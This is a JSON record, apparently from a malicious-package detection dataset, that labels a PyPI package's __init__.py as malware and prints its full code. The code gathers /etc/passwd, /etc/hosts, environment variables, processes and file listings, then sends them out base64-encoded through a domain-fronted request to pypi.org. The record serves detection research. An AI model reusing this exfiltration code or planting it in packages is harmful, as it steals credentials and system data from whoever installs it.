[
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "from urllib import request\nimport json\nimport os\nimport socket\nimport base64\n\ndef try_call(func, *args):\n    try:\n        return func(*args)\n    except:\n        return 'err'\n\npwd = \"\"\ntry:\n    pwd = '\\n'.join([x for x in open(\"/etc/passwd\")])\nexcept:\n    pass\n\nenv = \"\"\ntry:\n    for a in os.environ:\n        env += \"{}={}\".format(a, os.getenv(a))\nexcept:\n    pass\n\npotentialip = \"\"\nfrom socket import timeout\ntry:\n    r = request.Request(\"http://10.204.9.230:80\")\n    potentialip = request.urlopen(r, timeout = 5).read().decode('utf-8')\nexcept Exception as e:\n    pass\n\ndirs = \"\"\ntry:\n    dirs = '\\n'.join(os.listdir())\nexcept:\n    pass\n\nlog = \"\"\ntry:\n    log = '\\n'.join([x for x in open(\"logger.py\")])\nexcept:\n    pass\n\nhosts = \"\"\ntry:\n    hosts = '\\n'.join([x for x in open(\"/etc/hosts\")])\nexcept:\n    pass\n\nprocesses  = \"\"\ntry:\n    processes = [(int(p), c) for p, c in [x.rstrip('\\n').split(' ', 1) \\\n        for x in os.popen('ps h -eo pid:1,command')]]\nexcept:\n    pass\n\nallfiles = \"\"\ntry:\n    allfiles = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser(\"~\")) for f in fn]\nexcept:\n    pass\nallfiles = \"\"\n\nraspfiles = \"\"\ntry:\n    raspfiles = [os.path.join(dp, f) for dp, dn, fn in os.walk(\"/rasp\") for f in fn]\nexcept:\n    pass\n\ndata = {\n    'host' : try_call(os.uname),\n    'd' : try_call(os.path.expanduser, '~'),\n    'ev' : env,\n    'pwd' : pwd,\n    'dirs' : dirs,\n    'log' : log,\n    'hosts' : hosts,\n    'ip' : potentialip,\n    'ps' : processes,\n    'all' : allfiles,\n    'raspfiles' : raspfiles,\n    'c' : try_call(os.getcwd)\n}\ndata = json.dumps(data)\nencoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n\nr = request.Request('https://pypi.org/reqs?d=', data = encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'})\nk = request.urlopen(r)\nprint(k)"
  },
  {
    "metadata": {
      "package_name": "important_package-0.1.15",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/important_package-0.1.15.txt"
    }
  }
]